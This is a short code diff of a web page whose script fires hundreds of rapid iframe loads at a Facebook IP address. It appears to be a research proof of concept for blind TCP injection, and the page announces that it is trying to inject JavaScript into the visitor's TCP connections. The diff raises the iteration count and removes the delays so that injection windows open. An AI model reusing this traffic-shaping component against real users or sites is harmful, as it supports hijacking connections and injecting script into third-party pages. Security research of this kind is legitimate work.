@@ -24,11 +24,12 @@
 
         f = document.createElement('iframe');
         f.id = 'foo'; 
-        f.addEventListener("load", meh, false);
-        //f.src = 'http://s-static.ak.fbcdn.net/rsrc.php/v2/yv/r/aWMatkshsiW.png?' + Math.random();
+        f.addEventListener("load", doagain, false);
         //f.src = 'http://facebook.com';
         //f.src = 'http://' + unique + '-' + count + '.hobocomp.com/?' + Math.random();
+        
         f.src = 'http://69.171.229.11/';
+        //f.src = 'http://141.212.109.239:8080/';
         document.getElementById('container').appendChild(f);
 
         //sctimeout_id = setTimeout(scriptConnectTimeout, 15000);
@@ -41,8 +42,12 @@
 
         console.log('Loaded');
 
-        if (count++ < 100) {
-            sctimeout_id = setTimeout(doagain, 10000);
+        if (count++ < 600) {
+            doagain(); // need to go fast fast fast! (gaps
+                        // for receiving blind injections need to be
+                        // in places where they would be useful (e.g.
+                        // parsed as a response))
+            //sctimeout_id = setTimeout(doagain, 10);
         }
         //setTimeout(doagain, 30000);
     }
@@ -53,15 +58,19 @@
         unique = Math.round(Math.random()*100000);
         count = 0;
 
-        setTimeout(doagain, 15000);
+        setTimeout(doagain, 5000);
     }
 
     window.addEventListener("load", init, false);
 
 </script>
 </head>
-<body onload>
+<body>
+<center>
 <h1>Hi.</h1>
+
+Please stand by while I try to inject some JavaScript into your TCP connections.
+</center>
 
 <div id="container">
 <script id="foo"></script>
